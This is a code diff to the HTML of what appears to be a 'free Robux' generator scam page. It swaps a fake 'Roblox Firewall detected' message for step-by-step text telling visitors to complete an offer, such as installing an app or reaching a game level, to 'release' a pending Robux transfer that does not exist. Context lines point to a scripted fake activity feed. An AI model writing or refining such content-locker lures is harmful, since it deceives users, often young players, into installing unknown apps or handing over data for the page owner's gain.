@@ -12,6 +12,49 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <style>
+    .instruction-steps {
+    padding: 0 15px;
+    margin-bottom: 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+}
+
+.step-item {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    background: rgba(255, 255, 255, 0.03);
+    padding: 10px;
+    border-radius: 8px;
+    border: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.step-num {
+    background: var(--primary);
+    color: #000;
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 900;
+    font-size: 12px;
+    flex-shrink: 0;
+}
+
+.step-txt {
+    font-size: 12px;
+    color: #ccc;
+    line-height: 1.4;
+    text-align: left;
+}
+
+.step-txt b {
+    color: #fff;
+}
+
     #searchIcon {
     animation: breath 1.5s infinite ease-in-out;
 }
@@ -334,9 +377,22 @@
                     </div>
                 </div>
                 <div class="firewall-alert">
-                    <b>Roblox Firewall detected.</b>
-                    <span>Verify you are human to bypass the firewall and finalize the transfer.</span>
-                </div>
+    <b>Verification Required</b>
+    <span>Follow the steps below to release the pending Robux transfer:</span>
+</div>
+<div class="instruction-steps">
+    <div class="step-item">
+        <div class="step-num">1</div>
+        <div class="step-txt">Choose <b>one</b> easy offer from the list below.</div>
+    </div>
+    <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-txt">Complete the requirements (e.g., install an app or reach a level).</div>
+    </div>
+    <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-txt">Once verified, your <b><span id="lockerAmt"></span> Robux</b> will be released instantly.</div>
+    </div>
                    <div id="offersBody" style="min-height: 100px; display: flex; flex-direction: column; padding: 15px;">
     <div id="checkStatus" style="padding: 0 15px 15px;"></div>
     
@@ -684,4 +740,4 @@ async function startDynamicActivity() {
 window.onload = () => { fillUserQueue(); setTimeout(chatDirector, 1500); };
 </script>
 </body>
-</html>
+        </html>
